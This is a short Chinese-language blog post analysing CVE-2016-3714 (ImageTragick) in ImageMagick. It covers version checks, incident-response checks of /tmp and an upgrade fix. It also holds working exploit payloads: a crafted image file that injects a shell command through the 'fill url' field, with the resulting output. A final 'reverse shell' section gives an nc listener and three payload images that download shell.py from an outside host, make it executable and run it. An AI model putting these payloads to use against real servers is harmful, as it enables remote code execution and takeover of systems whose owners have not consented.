---
title: CVE-2016-3714 ImageMagick远程代码执行应急分析
date: 2016-05-12 00:42:08
tags: ImageMagick
---

### 测试步骤

首先确定是否安装了ImageMagick 6.9.3.10以下版本

```
> locate convert    #查找convert或者使用find / -name "imagemagick"
> convert -v        #确认版本是否存在漏洞
```

[POC](https://github.com/ImageTragick/PoCs)
> exploit.jpg

<!--more-->

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|ls "-la)'
pop graphic-context
```

```
> convert exploit.jpg out.png   #会在/tmp/目录下生成一个img开头的临时文件
```
```
总用量 76
dr-xr-x---  4 root root  4096  5月 11 12:47 .
drwxr-xr-x 23 root root  4096  5月  6 03:07 ..
-rw-------  1 root root  3784  5月  9 15:42 .bash_history
-rw-r--r--  1 root root    18  5月 20 2009 .bash_logout
-rw-r--r--  1 root root   176  5月 20 2009 .bash_profile
-rw-r--r--  1 root root   176  5月  9 13:16 .bashrc
drwx------  3 root root  4096  5月  9 12:54 .cache
-rw-r--r--  1 root root   100  9月 22 2004 .cshrc
-rw-r--r--  1 root root   112  5月 11 12:47 exploit.jpg
drwxr-----  3 root root  4096  5月  6 03:13 .pki
-rw-r--r--  1 root root   129 12月  3 2004 .tcshrc
convert: unrecognized color `https://example.com/image.jpg"|ls "-la' @ warning/color.c/GetColorCompliance/947.
convert: no decode delegate for this image format `/tmp/magick-_zb2Aad8' @ error/constitute.c/ReadImage/566.
convert: non-conforming drawing primitive definition `fill' @ error/draw.c/DrawImage/3145.
```
### 应急响应

```
> convert -v    #查看版本号是否存在问题
> ls /tmp/      #查看/tmp/目录下是否存在img开头的临时文件
```
```
[root@mail ~]# ls /tmp/
img9NPRv5  imgb2pY7B  imgHdgUmo  imgISGNkK  imglHyrmo  imgwEjr50
```

### 修复方案
升级ImageMagick到最新版本

### reverse shell
```
> nc -lvp 443
```
> shell.jpg

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|/usr/bin/wget "http://www.youdomain.com/shell.py" -O /tmp/shell.py")'
pop graphic-context
```
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|chmod "a+x" /tmp/shell.py")'
pop graphic-context
```
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|python /tmp/shell.py")'
pop graphic-context
```

